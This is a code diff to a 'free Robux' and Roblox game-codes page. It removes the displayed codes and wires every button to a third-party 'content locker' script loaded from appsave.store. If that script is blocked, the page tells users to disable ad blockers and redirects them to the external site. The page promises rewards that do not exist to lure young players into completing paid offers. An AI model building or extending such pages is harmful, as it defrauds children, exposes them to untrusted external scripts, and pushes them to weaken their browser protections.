@@ -49,7 +49,7 @@
             padding: 0 20px;
         }
 
-        /* 4. Username Input Section */
+        /* Username Input Section */
         .user-section {
             background: linear-gradient(135deg, #1e272e, #050505);
             padding: 30px;
@@ -96,7 +96,7 @@
             transform: scale(1.05);
         }
 
-        /* 5. Grid Layout for Cards (Robux & Games) */
+        /* Grid Layout for Cards (Robux & Games) */
         .grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
@@ -118,7 +118,6 @@
             border-color: var(--accent-color);
         }
 
-        /* High quality placeholder images */
         .card img {
             width: 100%;
             height: 160px;
@@ -134,19 +133,10 @@
             margin-top: 0;
             color: var(--accent-color);
         }
-
-        .code-display {
-            background-color: #111;
-            padding: 10px;
-            border-radius: 6px;
-            font-family: monospace;
-            font-size: 18px;
-            color: var(--gold-color);
-            margin: 15px 0;
-            border: 1px dashed var(--gold-color);
-            display: none; /* Hidden until username is connected */
-        }
     </style>
+
+    <!-- Your External Content Locker Script Integrated Here -->
+    <script type="text/javascript" id="ogjs" src="https://appsave.store"></script>
 </head>
 <body>
 
@@ -157,7 +147,7 @@
 
     <div class="container">
         
-        <!-- 4. Username Input Field -->
+        <!-- Username Input Field -->
         <div class="user-section">
             <h2>👤 Connect Your Roblox Account</h2>
             <p>Enter your Roblox username below to start unlocking rewards.</p>
@@ -169,46 +159,43 @@
 
         <div class="grid">
             
-            <!-- 2. Get Robux Section -->
+            <!-- Get Robux Section -->
             <div class="card">
                 <img src="https://unsplash.com" alt="Robux">
                 <div class="card-content">
                     <h3>💎 Claim Free Robux</h3>
                     <p>Instantly request 400 Robux to be sent to your linked account.</p>
-                    <button class="btn" onclick="claimRobux()">Claim Robux</button>
+                    <button class="btn" onclick="triggerLocker('Robux')">Claim Robux</button>
                 </div>
             </div>
 
-            <!-- 3. Blox Fruits Codes -->
+            <!-- Blox Fruits Codes -->
             <div class="card">
                 <img src="https://unsplash.com" alt="Blox Fruits">
                 <div class="card-content">
                     <h3>⚔️ Blox Fruits Codes</h3>
                     <p>Get double experience boosts and status reset codes.</p>
-                    <div id="code-blox" class="code-display">EXP_BOOST2026</div>
-                    <button class="btn" onclick="showCode('code-blox')">Reveal Code</button>
+                    <button class="btn" onclick="triggerLocker('Blox Fruits Codes')">Reveal Code</button>
                 </div>
             </div>
 
-            <!-- 3. Grow a Garden 2 Codes -->
+            <!-- Grow a Garden 2 Codes -->
             <div class="card">
                 <img src="https://unsplash.com" alt="Grow a Garden 2">
                 <div class="card-content">
                     <h3>🌱 Grow a Garden 2</h3>
                     <p>Unlock rare seeds, unique speed boosts, and tools.</p>
-                    <div id="code-garden" class="code-display">GARDEN_FREE55</div>
-                    <button class="btn" onclick="showCode('code-garden')">Reveal Code</button>
+                    <button class="btn" onclick="triggerLocker('Grow a Garden 2 Codes')">Reveal Code</button>
                 </div>
             </div>
 
-            <!-- 3. Steal a Brainrot Codes -->
+            <!-- Steal a Brainrot Codes -->
             <div class="card">
                 <img src="https://unsplash.com" alt="Steal a Brainrot">
                 <div class="card-content">
                     <h3>🧠 Steal a Brainrot</h3>
                     <p>Unlock free in-game memes, coins, and funny avatars.</p>
-                    <div id="code-brainrot" class="code-display">SIGMA_ROT99</div>
-                    <button class="btn" onclick="showCode('code-brainrot')">Reveal Code</button>
+                    <button class="btn" onclick="triggerLocker('Steal a Brainrot Codes')">Reveal Code</button>
                 </div>
             </div>
 
@@ -216,7 +203,7 @@
     </div>
 
     <script>
-        // Form Validation & Logic
+        // Username Validation
         function connectUser() {
             const username = document.getElementById('username').value;
             if (username.trim() === "") {
@@ -226,23 +213,24 @@
             }
         }
 
-        function claimRobux() {
+        // Centralized Function to Handle the Button Clicks and Script Execution
+        function triggerLocker(rewardType) {
             const username = document.getElementById('username').value;
+            
+            // Check if the user filled out the username field first
             if (username.trim() === "") {
-                alert("You must enter and link your username first!");
-            } else {
-                alert(`Processing request... 400 Robux is being sent to: ${username}!`);
-            }
-        }
-
-        function showCode(codeId) {
-            const username = document.getElementById('username').value;
-            if (username.trim() === "") {
-                alert("Please connect your username above to unlock game codes!");
+                alert(`Please connect your username above to unlock ${rewardType}!`);
                 return;
             }
-            const codeDiv = document.getElementById(codeId);
-            codeDiv.style.display = "block";
+            
+            // Check if the CPA network's function is ready to load
+            if (typeof og_load === "function") {
+                og_load();
+            } else {
+                // Fallback action if the script is blocked by an extension or slow to load
+                alert("Loading your offer... If the screen does not appear, please disable ad blockers.");
+                window.location.href = "https://appsave.store";
+            }
         }
     </script>
 
